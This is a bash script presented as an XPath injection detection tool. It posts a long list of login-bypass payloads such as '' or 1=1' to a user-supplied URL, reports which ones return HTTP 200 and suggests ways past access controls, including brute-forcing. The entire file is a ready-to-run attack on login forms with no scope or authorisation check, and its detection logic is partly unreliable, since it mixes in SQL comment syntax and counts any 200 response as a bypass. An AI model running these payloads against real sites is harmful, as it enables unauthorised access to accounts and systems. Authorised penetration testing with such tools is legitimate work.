#!/bin/bash
# This is a comment

# Define color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to perform XPath Injection detection
detect_xpath_injection() {
    echo -e "Detecting ${GREEN}XPath Injection vulnerabilities${NC}..."
    # Define XPath Injection payloads
    payloads=(
        "' or 1=1"
        "' or ''='"
        "' or 'x'='x"
        "' or '1'='1"
        "' or 'a'='a"
        "' or 'b'='b"
        "' or 'c'='c"
        "' or 'd'='d"
        "' or 'e'='e"
        "' or 'f'='f"
        "' or 'g'='g"
        "' or 'h'='h"
        "' or 'i'='i"
        "' or 'j'='j"
        "' or 'k'='k"
        "' or 'l'='l"
        "' or 'm'='m"
        "' or 'n'='n"
        "' or 'o'='o"
        "' or 'p'='p"
        "' or 'q'='q"
        "' or 'r'='r"
        "' or 's'='s"
        "' or 't'='t"
        "' or 'u'='u"
        "' or 'v'='v"
        "' or 'w'='w"
        "' or 'y'='y"
        "' or 'z'='z"
        "' or 1=1--"
        "' or ''='--"
        "' or 'x'='x--"
        "' or '1'='1--"
        "' or 'a'='a--"
        "' or 'b'='b--"
        "' or 'c'='c--"
        "' or 'd'='d--"
        "' or 'e'='e--"
        "' or 'f'='f--"
        "' or 'g'='g--"
        "' or 'h'='h--"
        "' or 'i'='i--"
        "' or 'j'='j--"
        "' or 'k'='k--"
        "' or 'l'='l--"
        "' or 'm'='m--"
        "' or 'n'='n--"
        "' or 'o'='o--"
        "' or 'p'='p--"
        "' or 'q'='q--"
        "' or 'r'='r--"
        "' or 's'='s--"
        "' or 't'='t--"
        "' or 'u'='u--"
        "' or 'v'='v--"
        "' or 'w'='w--"
        "' or 'y'='y--"
        "' or 'z'='z--"
        "' or 1=1#"
        "' or ''='#"
        "' or 'x'='x#"
        "' or '1'='1#"
        "' or 'a'='a#"
        "' or 'b'='b#"
        "' or 'c'='c#"
        "' or 'd'='d#"
        "' or 'e'='e#"
        "' or 'f'='f#"
        "' or 'g'='g#"
        "' or 'h'='h#"
        "' or 'i'='i#"
        "' or 'j'='j#"
        "' or 'k'='k#"
        "' or 'l'='l#"
        "' or 'm'='m#"
        "' or 'n'='n#"
        "' or 'o'='o#"
        "' or 'p'='p#"
        "' or 'q'='q#"
        "' or 'r'='r#"
        "' or 's'='s#"
        "' or 't'='t#"
        "' or 'u'='u#"
        "' or 'v'='v#"
        "' or 'w'='w#"
        "' or 'y'='y#"
        "' or 'z'='z#"
        "' or 1=1/*"
        "' or ''='/*"
        "' or 'x'='x/*"
        "' or '1'='1/*"
        "' or 'a'='a/*"
        "' or 'b'='b/*"
        "' or 'c'='c/*"
        "' or 'd'='d/*"
        "' or 'e'='e/*"
        "' or 'f'='f/*"
        "' or 'g'='g/*"
        "' or 'h'='h/*"
        "' or 'i'='i/*"
        "' or 'j'='j/*"
        "' or 'k'='k/*"
        "' or 'l'='l/*"
        "' or 'm'='m/*"
        "' or 'n'='n/*"
        "' or 'o'='o/*"
        "' or 'p'='p/*"
        "' or 'q'='q/*"
        "' or 'r'='r/*"
        "' or 's'='s/*"
        "' or 't'='t/*"
        "' or 'u'='u/*"
        "' or 'v'='v/*"
        "' or 'w'='w/*"
        "' or 'y'='y/*"
        "' or 'z'='z/*"
        "' or 1=1%00"
        "' or ''='%00"
        "' or 'x'='x%00"
        "' or '1'='1%00"
        "' or 'a'='a%00"
        "' or 'b'='b%00"
        "' or 'c'='c%00"
        "' or 'd'='d%00"
        "' or 'e'='e%00"
        "' or 'f'='f%00"
        "' or 'g'='g%00"
        "' or 'h'='h%00"
        "' or 'i'='i%00"
        "' or 'j'='j%00"
        "' or 'k'='k%00"
        "' or 'l'='l%00"
        "' or 'm'='m%00"
        "' or 'n'='n%00"
        "' or 'o'='o%00"
        "' or 'p'='p%00"
        "' or 'q'='q%00"
        "' or 'r'='r%00"
        "' or 's'='s%00"
        "' or 't'='t%00"
        "' or 'u'='u%00"
        "' or 'v'='v%00"
        "' or 'w'='w%00"
        "' or 'y'='y%00"
        "' or 'z'='z%00"
    )

    # Iterate over payloads and inject them into vulnerable parameters
    for payload in "${payloads[@]}"; do
        echo -e "Testing payload: ${BLUE}$payload${NC}"
        response=$(curl -s -w "%{http_code}" -d "username=$payload&password=test" -X POST "$1" -o /dev/null)
        response_code=${response: -3}  # Extract last 3 characters (HTTP status code)
        response_body=$(curl -s -d "username=$payload&password=test" -X POST "$1")
        
        echo -e "Response code: ${BLUE}$response_code${NC}"
        echo -e "Response content: $response_body"
        
        if [[ $response_code -eq 200 ]]; then
            echo -e "${GREEN}Payload succeeded:${NC} $payload"
            echo -e "To test this response content, click on the following URL:"
            echo -e "${BLUE}$1?username=$payload&password=test${NC}\n"
        else
            echo -e "${RED}Payload failed:${NC} $payload"
            # Analyze response content to determine potential reasons for failure
            analyze_response "$response_body" "$payload" "$1"
            echo -e "To test this response content, click on the following URL:"
            echo -e "${BLUE}$1?username=$payload&password=test${NC}\n"
        fi
    done
}

# Function to analyze response content and suggest bypass techniques
analyze_response() {
    echo -e "${RED}Analysis:${NC}"
    # Example analysis logic, replace with actual analysis code
    if [[ $1 == *"Access denied"* ]]; then
        echo "Access denied message detected in the response."
        echo "Potential bypass: Try using a different syntax or encoding for the payload."
        echo "For example, try using URL encoding or different XPath syntax."
        echo "If automated bypass fails, manually inspect the application's behavior for vulnerabilities."
    elif [[ $1 == *"Invalid credentials"* ]]; then
        echo "Invalid credentials message detected in the response."
        echo "Potential bypass: Try injecting payloads in other parameters or altering the query structure."
        echo "Additionally, consider brute-forcing or using different payloads."
        echo "If automated bypass fails, manually inspect the application's behavior for vulnerabilities."
    elif [[ $1 == *"Syntax error"* ]]; then
        echo "Syntax error message detected in the response."
        echo "Potential bypass: Modify the payload to avoid triggering syntax errors."
        echo "If automated bypass fails, manually inspect the application's behavior for vulnerabilities."
    elif [[ $1 == *"Forbidden"* ]]; then
        echo "Forbidden message detected in the response."
        echo "Potential bypass: Use techniques to bypass access controls, such as exploiting logic flaws or authentication bypass."
        echo "If automated bypass fails, manually inspect the application's behavior for vulnerabilities."
    else
        echo "Response content does not indicate a specific reason for failure."
        echo "Further analysis or testing may be required."
        echo "If automated bypass attempts fail, manually inspect the application's behavior for vulnerabilities."
    fi
}

# Main function
main() {
    echo -e "${GREEN}XPath Injection Detection Tool${NC}"
    echo "------------------------------"

    # Prompt user for target URL
    read -p "Enter your target URL: " target_url

    # Perform XPath Injection detection
    detect_xpath_injection "$target_url"
}

# Call main function
main
